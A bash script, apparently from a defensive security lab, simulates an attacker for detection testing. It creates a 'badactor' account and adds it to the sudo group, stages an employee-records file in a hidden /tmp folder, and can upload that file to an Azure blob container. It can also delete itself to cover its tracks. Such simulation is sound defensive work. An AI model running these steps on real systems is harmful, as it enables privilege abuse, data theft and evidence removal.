#!/usr/bin/env bash
# 01_attack_simulation.sh
# Simulates attacker behavior:
#  - Privilege escalation via sudo group modification
#  - Data staging / optional cloud exfiltration
#  - Optional self-delete to mimic attacker cleanup
#
# Defensive lab use only.

set -euo pipefail

# --- Config (safe defaults) ---
ATTACKER_USER="${ATTACKER_USER:-badactor}"
SECRET_FILE="${SECRET_FILE:-/home/$USER/.secret_data/employee_records.txt}"
STAGE_DIR="${STAGE_DIR:-/tmp/.stage}"
SELF_DELETE="${SELF_DELETE:-false}"

# Optional Azure upload (only runs if all vars are set)
AZURE_STORAGE_ACCOUNT="${AZURE_STORAGE_ACCOUNT:-}"
AZURE_STORAGE_CONTAINER="${AZURE_STORAGE_CONTAINER:-}"
AZURE_STORAGE_KEY="${AZURE_STORAGE_KEY:-}"
AZURE_BLOB_NAME="${AZURE_BLOB_NAME:-employee_records.txt}"

echo "[*] Starting attack simulation phase..."

# --- 1) Create attacker user (if missing) ---
if id "$ATTACKER_USER" >/dev/null 2>&1; then
  echo "[*] Attacker user '$ATTACKER_USER' already exists."
else
  echo "[*] Creating attacker user '$ATTACKER_USER'..."
  sudo useradd -m "$ATTACKER_USER"
fi

# --- 2) Privilege escalation attempt (sudo group) ---
echo "[*] Attempting privilege escalation: add '$ATTACKER_USER' to sudo group..."
sudo usermod -aG sudo "$ATTACKER_USER"
echo "[+] '$ATTACKER_USER' added to sudo group (simulated escalation)."

# --- 3) Data staging (simulates preparation for exfiltration) ---
echo "[*] Staging sensitive file..."
if [[ ! -f "$SECRET_FILE" ]]; then
  echo "[!] Secret file not found at: $SECRET_FILE"
  echo "    Run scripts/00_setup_lab.sh first, or set SECRET_FILE env var."
  exit 1
fi

mkdir -p "$STAGE_DIR"
cp "$SECRET_FILE" "$STAGE_DIR/"
echo "[+] Staged file at: $STAGE_DIR/$(basename "$SECRET_FILE")"

# --- 4) Optional cloud upload (Azure Blob) ---
# Runs ONLY if Azure CLI exists and all three env vars are set
if command -v az >/dev/null 2>&1 \
  && [[ -n "$AZURE_STORAGE_ACCOUNT" && -n "$AZURE_STORAGE_CONTAINER" && -n "$AZURE_STORAGE_KEY" ]]; then

  echo "[*] Azure CLI detected + env vars present. Uploading staged file to Azure Blob..."
  az storage blob upload \
    --account-name "$AZURE_STORAGE_ACCOUNT" \
    --container-name "$AZURE_STORAGE_CONTAINER" \
    --account-key "$AZURE_STORAGE_KEY" \
    --file "$STAGE_DIR/$(basename "$SECRET_FILE")" \
    --name "$AZURE_BLOB_NAME" \
    --overwrite true >/dev/null

  echo "[+] Upload complete (simulated exfiltration)."
else
  echo "[*] Skipping Azure upload (missing az CLI or required env vars)."
  echo "    To enable upload, set: AZURE_STORAGE_ACCOUNT, AZURE_STORAGE_CONTAINER, AZURE_STORAGE_KEY"
fi

# --- 5) Optional self-delete (mimics attacker cleanup) ---
if [[ "$SELF_DELETE" == "true" ]]; then
  echo "[*] SELF_DELETE=true → removing this script to mimic attacker cleanup..."
  rm -- "$0"
  echo "[+] Script deleted."
else
  echo "[*] SELF_DELETE=false → script retained."
fi

echo "[*] Attack simulation complete."
